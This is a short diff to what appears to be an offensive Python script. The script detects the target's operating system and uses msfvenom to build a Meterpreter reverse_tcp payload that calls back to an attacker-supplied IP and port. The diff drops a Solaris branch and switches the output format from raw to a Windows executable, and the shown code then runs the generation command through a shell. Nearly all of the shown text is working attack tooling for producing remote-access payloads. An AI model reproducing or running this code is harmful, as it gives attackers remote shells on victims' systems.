@@ -92,15 +92,13 @@ if osInfo.find("windows") != -1:
 elif osInfo.find("linux") != -1:
     os = "linux"
     print(os)
-elif osInfo.find("solarlis") !=-1:
-    os = "solaris"
-    print(os)
+
  
 if os == "":
     print("[*] Unable to profile OS, defaulting to Windows.")
     os = "windows"
  
-payload = ("msfvenom -p "+os+"/x64/meterpreter/reverse_tcp LHOST="+attackerIP+" LPORT="+attackerPort+" EXITFUNC=thread -f raw -o " + filename)
+payload = ("msfvenom -p "+os+"/x64/meterpreter/reverse_tcp LHOST="+attackerIP+" LPORT="+attackerPort+" EXITFUNC=thread -f exe -o " + filename)
 print("[*] Exporting payload, please be patient as: " + filename)
 subprocess.Popen(payload, shell=True).wait()
 print("[*] Exported payload successfully.")
